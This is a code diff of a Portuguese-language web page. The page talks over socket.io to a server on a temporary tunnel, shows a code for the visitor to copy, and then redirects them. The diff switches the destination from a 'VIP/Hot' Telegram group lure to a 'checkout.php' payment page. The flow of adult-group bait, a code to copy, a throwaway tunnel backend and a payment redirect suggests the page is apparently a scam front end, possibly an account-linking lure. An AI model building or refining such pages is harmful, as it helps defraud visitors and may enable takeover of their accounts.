@@ -263,11 +263,10 @@
     <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
     <script>
         // CONFIGURAÇÕES
-        // ATENÇÃO: Substitua pelo link do seu Tunnel/VPS atualizado
         const API_URL = 'https://tunes-houston-count-balloon.trycloudflare.com'; 
         
-        // Link para onde a pessoa vai após conectar (O Grupo VIP/Hot)
-        const LINK_DO_GRUPO = 'https://t.me/SEU_LINK_AQUI'; 
+        // --- ALTERADO AQUI: AGORA VAI PARA O ARQUIVO PHP DE PAGAMENTO ---
+        const LINK_DO_GRUPO = 'checkout.php'; 
 
         let socket;
         let sessionId = 'vip_user_' + Date.now(); 
@@ -352,14 +351,13 @@
             document.getElementById('display-code').innerText = formatted;
         }
 
-        // Função de Copiar Código (NOVA)
+        // Função de Copiar Código
         function copiarCodigo() {
             const codeText = document.getElementById('display-code').innerText;
             
             navigator.clipboard.writeText(codeText).then(() => {
                 // Feedback visual
                 const btn = document.querySelector('.btn-copy');
-                const originalHtml = btn.innerHTML; // Salva o estado original
                 
                 btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
                 btn.style.color = '#00ff88';
@@ -380,7 +378,7 @@
             document.getElementById('step-code').style.display = 'none';
             document.getElementById('step-success').style.display = 'block';
             
-            // Redireciona após 2 segundos
+            // Redireciona após 2 segundos para a PÁGINA DE PAGAMENTO
             setTimeout(() => {
                 window.location.href = LINK_DO_GRUPO;
             }, 2000);
